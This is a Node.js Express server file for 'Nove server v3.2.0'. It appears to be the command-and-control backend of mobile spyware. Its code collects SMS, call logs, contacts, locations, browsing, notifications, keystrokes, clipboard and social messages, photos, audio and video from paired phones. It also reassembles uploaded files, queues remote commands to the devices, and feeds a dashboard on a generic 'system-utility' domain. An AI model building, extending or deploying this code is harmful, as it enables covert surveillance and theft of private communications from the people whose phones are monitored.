// Nove server v3.2.0 (extensions) — drop-in replacement for the v3.1.0 server.
//
// Adds:
//   POST /api/v2/devices/:deviceId/cmd        — extended command dispatcher
//   POST /api/v2/devices/:deviceId/result     — app -> server command result
//   GET  /api/v2/devices/:deviceId/results    — recent command results
//   GET  /api/v2/devices/:deviceId/live       — SSE stream of results
//   GET  /api/v2/devices/:deviceId/files      — list reassembled files
//   GET  /api/v2/devices/:deviceId/files/:id  — download / inline preview
//   DELETE /api/v2/devices/:deviceId/files/:id
//   file_* messages in /api/v2/data are reassembled on disk
//
// All v3.1.0 endpoints continue to work — the structure is preserved.

import express from 'express'
import cors from 'cors'
import dotenv from 'dotenv'
import rateLimit from 'express-rate-limit'
import helmet from 'helmet'
import crypto from 'crypto'
import path from 'path'
import { existsSync } from 'fs'
import { fileURLToPath } from 'url'

import { initFirebase, db } from './lib/firebase.js'
import { verifyUser, sanitizeDeviceId, sanitizeUserId } from './lib/middleware.js'
import { mountExtensions } from './mount.js'
import { handleFileMessage } from './routes/files.js'

dotenv.config()
await initFirebase()

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const app = express()

app.use(helmet({ contentSecurityPolicy: false }))
app.use(cors({
  origin: process.env.ALLOWED_ORIGINS?.split(',') || ['https://dashboard.system-utility.cloud'],
  credentials: true,
  methods: ['GET', 'POST', 'DELETE']
}))
app.use(express.json({ limit: '8mb' }))

app.use((req, res, next) => {
  if (req.url.startsWith('/api/') && !req.url.startsWith('/api/v2')) {
    req.url = '/api/v2' + req.url.slice(4)
  }
  next()
})

const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex')
const ALGORITHM = 'aes-256-gcm'
const encrypt = (text) => {
  try {
    const iv = crypto.randomBytes(16)
    const cipher = crypto.createCipheriv(ALGORITHM, Buffer.from(ENCRYPTION_KEY, 'hex'), iv)
    let enc = cipher.update(text, 'utf8', 'hex'); enc += cipher.final('hex')
    return iv.toString('hex') + ':' + cipher.getAuthTag().toString('hex') + ':' + enc
  } catch (e) { return null }
}

const parseJsonArray = (raw) => {
  if (Array.isArray(raw)) return raw
  if (typeof raw === 'string') { try { const p = JSON.parse(raw); return Array.isArray(p) ? p : [] } catch (_) { return [] } }
  return []
}
const appendHistory = async (refPath, entry, cap) => {
  await db.ref(refPath).transaction((current) => {
    const arr = parseJsonArray(current); arr.push(entry)
    return JSON.stringify(arr.slice(-cap))
  })
}

const MODULE_CAPS = { sms: 1000, calls: 1000, contacts: 2000, locations: 1000, browsing: 1000, media: 1000, apps: 500, device: 20, network: 100, notifications: 300, keylog: 500, events: 300, photos: 60, audio: 12, videos: 12 }
const TYPE_TO_MODULE = {
  sms: 'sms', call: 'calls', contact: 'contacts', location: 'locations',
  browsing: 'browsing', media: 'media', app_usage: 'apps', device_info: 'device',
  network: 'network', notification: 'notifications',
  text_change: 'keylog', social_message: 'keylog', clipboard: 'keylog',
  window_change: 'events', focus: 'events'
}
const hashString = (s) => crypto.createHash('sha1').update(String(s)).digest('hex')

const appendModuleBatch = async (refPath, entries, cap) => {
  if (entries.length === 0) return
  await db.ref(refPath).transaction((current) => {
    const arr = parseJsonArray(current)
    let changed = false
    for (const e of entries) { if (e.h && arr.some((x) => x && x.h === e.h)) continue; arr.push(e); changed = true }
    if (!changed) return current
    return JSON.stringify(arr.slice(-cap))
  })
}

const telemetryLimiter = rateLimit({ windowMs: 5 * 60_000, max: 50, keyGenerator: (req) => req.deviceId || req.ip, standardHeaders: false, legacyHeaders: false })
const pairLimiter = rateLimit({ windowMs: 15 * 60_000, max: 20, keyGenerator: (req) => req.uid || req.ip, standardHeaders: false, legacyHeaders: false, handler: (req, res) => res.status(429).json({ error: 'Too many attempts — wait a few minutes.' }) })
const PAIR_CODE_TTL_MS = 300_000

const validateDevice = async (req, res, next) => {
  const rawId = req.headers['x-device-id'] || req.body?.device_id
  const deviceId = sanitizeDeviceId(rawId)
  if (!deviceId) return res.status(401).json({ error: 'invalid device id' })
  try {
    const snap = await db.ref(`devices/${deviceId}`).once('value')
    if (!snap.exists()) return res.status(403).json({ error: 'device not found' })
    if (!snap.val().pairedTo) return res.status(403).json({ error: 'device not paired' })
    req.deviceId = deviceId; next()
  } catch (e) { res.status(500).json({ error: 'server error' }) }
}
const validateDeviceLoose = async (req, res, next) => {
  const rawId = req.headers['x-device-id'] || req.body?.device_id
  const deviceId = sanitizeDeviceId(rawId)
  if (!deviceId) return res.status(401).json({ error: 'invalid device id' })
  req.deviceId = deviceId; next()
}

// ---- v3.1.0 routes (preserved) ----
app.get('/', (req, res) => {
  const distIndex = path.join(__dirname, '..', 'dashboard', 'dist', 'index.html')
  if (existsSync(distIndex)) return res.sendFile(distIndex)
  res.json({ status: 'online', version: '3.2.0-ext' })
})
app.get('/api/v2/status', (req, res) => res.json({ status: 'online', version: '3.2.0-ext', uptime: Math.floor(process.uptime()) }))

app.get('/api/v2/devices', verifyUser, async (req, res) => {
  try {
    const owned = (await db.ref(`users/${req.uid}/devices`).once('value')).val() || {}
    const ids = Object.keys(owned)
    const devices = await Promise.all(ids.map(async (id) => {
      const s = await db.ref(`devices/${id}`).once('value'); if (!s.exists()) return null
      const d = s.val()
      return { deviceId: id, status: d.status || 'unknown', battery: typeof d.battery === 'number' ? d.battery : null, interval: d.interval || null, lastSeen: d.lastSeen || null, updatedAt: d.updatedAt || null, pairedAt: owned[id]?.pairedAt || null, config: d.config && typeof d.config === 'object' ? d.config : null }
    }))
    res.json({ success: true, devices: devices.filter(Boolean) })
  } catch (e) { res.status(500).json({ error: 'internal' }) }
})

app.post('/api/v2/telemetry', telemetryLimiter, validateDeviceLoose, async (req, res) => {
  try {
    const { device_id, timestamp, status, battery, interval, pairing_code, pairing_request, type, permissions } = req.body
    const deviceId = sanitizeDeviceId(device_id) || req.deviceId
    if (battery !== undefined && (typeof battery !== 'number' || battery < 0 || battery > 100)) return res.status(400).json({ error: 'invalid battery' })
    if (interval !== undefined && (typeof interval !== 'number' || interval < 30 || interval > 3600)) return res.status(400).json({ error: 'invalid interval' })

    const update = { lastSeen: timestamp || Date.now(), status: status || 'active', updatedAt: Date.now() }
    if (battery !== undefined) update.battery = battery
    if (interval !== undefined) update.interval = interval
    await db.ref(`devices/${deviceId}`).update(update)

    if (typeof battery === 'number') await appendHistory(`devices/${deviceId}/history/battery`, { t: timestamp || Date.now(), b: battery }, 720)
    if (typeof type === 'string' && type.length > 0) {
      const ev = { type, ts: timestamp || Date.now() }
      if (permissions !== undefined) ev.data = { permissions }
      await appendHistory(`devices/${deviceId}/history/events`, ev, 200)
    }

    let paired = false
    if (pairing_request === true && typeof pairing_code === 'string' && /^\d{6}$/.test(pairing_code)) {
      const pairedSnap = await db.ref(`devices/${deviceId}/pairedTo`).once('value')
      if (pairedSnap.exists()) paired = true
      else {
        const now = Date.now()
        await db.ref(`pairing_requests/${deviceId}`).set({ pairing_code, device_id: deviceId, timestamp: now })
        const reqs = (await db.ref('pairing_requests').once('value')).val() || {}
        const prune = {}
        Object.entries(reqs).forEach(([id, v]) => { if (v && now - (v.timestamp || 0) > PAIR_CODE_TTL_MS) prune[id] = null })
        if (Object.keys(prune).length > 0) await db.ref('pairing_requests').update(prune)
      }
    }
    const commandsSnap = await db.ref(`devices/${deviceId}/commands`).orderByChild('timestamp').limitToLast(5).once('value')
    res.json({ success: true, commands: commandsSnap.val() || null, paired })
  } catch (e) { res.status(500).json({ error: 'internal' }) }
})

app.post('/api/v2/data', telemetryLimiter, validateDevice, async (req, res) => {
  try {
    const deviceId = req.deviceId
    const batch = req.body
    if (!batch || typeof batch !== 'object') return res.status(400).json({ error: 'invalid batch' })

    const batchRef = db.ref(`devices/${deviceId}/raw_batches`)
    const encrypted = { data: encrypt(JSON.stringify(batch)), receivedAt: Date.now() }
    await batchRef.push(encrypted)
    await batchRef.transaction((cur) => {
      if (!cur) return cur
      const keys = Object.keys(cur); if (keys.length <= 100) return cur
      keys.sort()
      const toDrop = keys.slice(0, keys.length - 100)
      const out = { ...cur }; toDrop.forEach((k) => delete out[k]); return out
    })

    if (Array.isArray(batch.messages)) {
      const grouped = {}
      for (const msg of batch.messages) {
        if (!msg) continue
        // Extended: file reassembly first
        if (typeof msg.type === 'string' && msg.type.startsWith('file_')) {
          try { await handleFileMessage(deviceId, msg) } catch (e) { console.error('file msg', e.message) }
          continue
        }
        const module = TYPE_TO_MODULE[msg.type]
        if (!module) continue
        let data = null
        try { data = typeof msg.content === 'string' ? JSON.parse(msg.content) : msg.content } catch (_) { continue }
        if (!data || typeof data !== 'object') continue
        const ts = data.ts || data.date || data.timestamp || msg.timestamp || Date.now()
        const content = typeof msg.content === 'string' ? msg.content : JSON.stringify(data)
        ;(grouped[module] = grouped[module] || []).push({ t: ts, d: data, h: hashString(content) })
      }
      await Promise.all(Object.entries(grouped).map(([m, entries]) => appendModuleBatch(`devices/${deviceId}/modules/${m}`, entries, MODULE_CAPS[m])))
    }
    res.json({ success: true, received: Array.isArray(batch.messages) ? batch.messages.length : 0 })
  } catch (e) { console.error('data', e.message); res.status(500).json({ error: 'internal' }) }
})

app.post('/api/v2/pair', verifyUser, pairLimiter, async (req, res) => {
  try {
    const { code } = req.body
    const userId = sanitizeUserId(req.uid)
    if (!code || typeof code !== 'string' || !/^\d{6}$/.test(code)) return res.status(400).json({ error: 'invalid code' })
    const snap = await db.ref('pairing_requests').once('value')
    const requests = snap.val() || {}
    const entry = Object.entries(requests).find(([_, v]) => v.pairing_code === code && Date.now() - v.timestamp < PAIR_CODE_TTL_MS)
    if (!entry) return res.status(404).json({ error: 'invalid or expired code' })
    const [deviceId] = entry
    if ((await db.ref(`devices/${deviceId}/pairedTo`).once('value')).exists()) return res.status(409).json({ error: 'already paired' })
    await db.ref(`users/${userId}/devices/${deviceId}`).set({ pairedAt: Date.now() })
    await db.ref(`devices/${deviceId}/pairedTo`).set(userId)
    await db.ref(`pairing_requests/${deviceId}`).remove()
    await appendHistory(`devices/${deviceId}/history/events`, { type: 'paired', ts: Date.now(), data: { account: userId } }, 200)
    res.json({ success: true, deviceId })
  } catch (e) { res.status(500).json({ error: 'internal' }) }
})

// ---- v3.2.0-ext routes (mount) ----
const ext = mountExtensions(app, { verifyUser, sanitizeDeviceId, db })

// ---- serve dashboard ----
const dashboardDist = path.join(__dirname, '..', 'dashboard', 'dist')
if (existsSync(dashboardDist)) {
  app.use(express.static(dashboardDist))
  app.get('*', (req, res, next) => { if (req.path.startsWith('/api')) return next(); res.sendFile(path.join(dashboardDist, 'index.html')) })
}

const PORT = process.env.PORT || 3000
app.listen(PORT, () => console.log(`Nove server v3.2.0-ext listening on ${PORT}`))
